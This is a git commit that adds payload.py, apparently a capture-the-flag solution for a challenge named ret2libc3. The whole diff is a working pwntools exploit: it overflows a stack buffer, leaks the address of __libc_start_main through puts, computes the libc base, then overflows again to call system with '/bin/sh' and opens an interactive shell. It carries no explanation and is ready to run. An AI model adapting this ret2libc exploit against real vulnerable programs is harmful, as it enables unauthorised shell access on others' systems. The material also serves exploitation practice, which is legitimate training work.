4990fbab0e3d9c328271bdd6bbad1906b4131c94
张靖昆 <55184183+tobbykun@users.noreply.github.com>
2023-11-19 13:42:10 +0800

    Update payload.py

--- ret2libc3/payload.py
+++ ret2libc3/payload.py
@@ -1,1 +1,19 @@
+from pwn import *
 
+
+sh = process('./ret2libc3')
+elf = ELF('./ret2libc3')
+libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')
+
+puts_plt = elf.plt['puts']
+libc_start_main_got = elf.got['__libc_start_main']
+main = elf.symbols['main']
+
+sh.sendlineafter('Can you find it !?', flat([112 * 'a', puts_plt, main, libc_start_main_got]))
+libc_start_main_add = u32(sh.recv()[0:4])
+libcbase = libc_start_main_add - libc.symbols['__libc_start_main']
+system_addr = libcbase + libc.symbols['system']
+binsh_addr = libcbase + next(libc.search(b'/bin/sh'))
+sh.sendline(flat([104 * 'a', system_addr, 'aaaa', binsh_addr]))
+
+sh.interactive()
